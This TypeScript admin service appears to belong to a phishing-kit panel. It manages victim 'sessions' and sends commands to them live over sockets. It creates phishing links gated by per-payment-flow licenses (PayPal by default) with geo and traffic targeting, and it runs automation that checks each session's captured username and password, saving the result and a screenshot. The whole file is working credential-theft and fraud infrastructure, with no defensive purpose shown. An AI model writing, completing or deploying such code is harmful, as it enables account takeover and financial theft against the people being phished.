
import * as db from '../db';
import { getSocketIO } from '../socket';
import { TokenPayload, SessionWithData } from '../types';

export class AdminService {

    /**
     * Get sessions for a user (Admin or Hypervisor)
     */
    static async getSessions(user: TokenPayload) {
        if (user.role === 'hypervisor') {
            return db.getAllSessions();
        } else {
            // Normal admin: get only their sessions
            // Filter is done at DB level if possible, but getAllSessions returns all?
            // db.ts had getSessionsByIp, getAllSessions.
            // We need getSessionsByAdmin.
            // Let's check db/repos/sessions.ts.
            // If missing, we filter in memory (not ideal but ok for now) or add repo method.
            const all = await db.getAllSessions();
            return all.filter((s) => s.adminId === user.id);
        }
    }

    /**
     * Send a command to a session
     */
    static async sendCommand(sessionId: string, action: string, payload: Record<string, unknown>) {
        const io = getSocketIO();

        // Queue in DB
        await db.queueCommand(sessionId, action, payload);

        // Emit to Socket
        const cmd = { action, payload };
        io.to(sessionId).emit('command', cmd); // To client

        // Notify admins that command was sent (optional, but good for UI sync)
        io.to('admin').emit('command-sent', { sessionId, ...cmd });

        return cmd;
    }

    /**
     * Get links for a user
     */
    static async getLinks(user: TokenPayload) {
        if (user.role === 'hypervisor') {
            return db.getLinks();
        } else {
            const all = await db.getLinks();
            return all.filter((l: any) => l.adminId === user.id);
        }
    }

    /**
     * Create a new link
     */
    static async createLink(user: TokenPayload, code: string, flowConfig: Record<string, unknown> = {}, themeConfig: Record<string, unknown> = {}, abConfig: Record<string, unknown> = {}, trafficConfig: Record<string, unknown> = {}, geoConfig: Record<string, unknown> = {}, approvalConfig: Record<string, unknown> = {}) {
        // License Check
        if (user.role !== 'hypervisor') {
            const flowId = (flowConfig.flowId as string) || 'paypal';
            const { BillingService } = await import('./billing.service'); // Dynamic import to avoid cycles if any
            const hasLicense = await BillingService.hasActiveLicense(user.id, flowId);

            if (!hasLicense) {
                // Check if they have a generic 'all_access' license? 
                // For now, strict per-flow.
                throw new Error(`License required for payment flow: ${flowId.toUpperCase()}`);
            }
        }
        return db.createLink(code, user.id, flowConfig, themeConfig, abConfig, trafficConfig, geoConfig, approvalConfig);
    }

    /**
     * Delete a link
     */
    static async deleteLink(user: TokenPayload, code: string) {
        // Verify ownership
        const link = await db.getLinkByCode(code);
        if (!link) throw new Error('Link not found');

        if (user.role !== 'hypervisor' && link.adminId !== user.id) {
            throw new Error('Unauthorized');
        }

        return db.deleteLink(code);
    }

    /**
     * Trigger session verification manually
     */
    static async verifySession(sessionId: string) {
        // Fetch session
        const session = await db.getSession(sessionId);
        if (!session) throw new Error('Session not found');

        // Dynamic import to avoid cycle if any
        const { AutomationService } = await import('./automation.service');

        // Trigger Automation
        const sessionData = session as any;
        const result = await AutomationService.verifySession({
            sessionId: session.id,
            userId: session.adminId || 'hypervisor',
            flowId: sessionData.flowId || 'generic',
            credentials: {
                username: sessionData.email || sessionData.username,
                password: sessionData.password,
                ...sessionData
            },
            fingerprint: sessionData.fingerprint
        });

        // Update DB
        const updateData = {
            automationStatus: result.status,
            automationDetails: result.details,
            automationScreenshot: result.screenshot
        };
        // Reuse SessionService or DB upsert logic? DB upsert is cleaner as SessionService might be heavy
        // But we need to update the session in DB
        // We can use db.upsertSession, but we need the full object or just merge?
        // upsertSession merges data.

        await db.upsertSession(sessionId, updateData, session.ip || '127.0.0.1', session.adminId, session.variant);

        // Notify Sockets
        const io = getSocketIO();
        io.emit('session-update', { id: sessionId, ...updateData });

        return result;
    }
}
